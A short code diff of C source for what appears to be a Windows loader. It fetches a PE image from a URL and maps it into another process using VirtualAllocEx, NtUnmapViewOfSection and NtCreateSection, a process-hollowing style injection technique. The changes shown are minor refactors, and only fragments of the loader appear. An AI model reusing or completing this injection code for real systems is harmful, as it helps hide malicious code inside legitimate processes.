@@ -81,7 +81,7 @@ BYTE* fetchPE(char* url){
 }
 
 
-MappingMetadata PEParser(BYTE* pe){
+extern MappingMetadata PEParser(BYTE* pe){
     // works entirely on heap
     MappingMetadata mm;
     mm.heapBase=pe;
@@ -107,7 +107,7 @@ MappingMetadata PEParser(BYTE* pe){
 
 
 
-char* mapRoutineX(HANDLE proc,MappingMetadata mm,IMAGE_SECTION_HEADER **reloc){
+extern char* mapRoutineX(HANDLE proc,MappingMetadata mm,IMAGE_SECTION_HEADER **reloc){
     char* remoteV=(char*)VirtualAllocEx(
         proc,
         (void*)mm.preferedBase,
@@ -317,7 +317,6 @@ HMODULE ntdll=GetModuleHandleA("ntdll");
 T_NtQueryInformationProcess NtQueryInformationProcess=(T_NtQueryInformationProcess)GetProcAddress(ntdll,"NtQueryInformationProcess");
 T_NtUnmapViewOfSection NtUnmapViewOfSection=(T_NtUnmapViewOfSection)GetProcAddress(ntdll,"NtUnmapViewOfSection");
 T_NtCreateSection NtCreateSection=(T_NtCreateSection)GetProcAddress(ntdll,"NtCreateSection");
-P_LdrLoadDll LdrLoadDll=(P_LdrLoadDll)GetProcAddress(ntdll,"LdrLoadDll");
 
 PROCESS_BASIC_INFORMATION self_pinfo;
 unsigned long sz=sizeof(self_pinfo);
@@ -410,7 +409,7 @@ size_t count=1;
 char** loadedDlls=malloc(sizeof(char*)*count);
 loadedDlls[0]=native;
 
-resolveIAT(proc,LdrLoadDll,remoteV,&loadedDlls,&count);
+resolveIAT(proc,pinfo,remoteV,&loadedDlls,&count);
 
 dumpLoadedDlls(loadedDlls,&count);
 
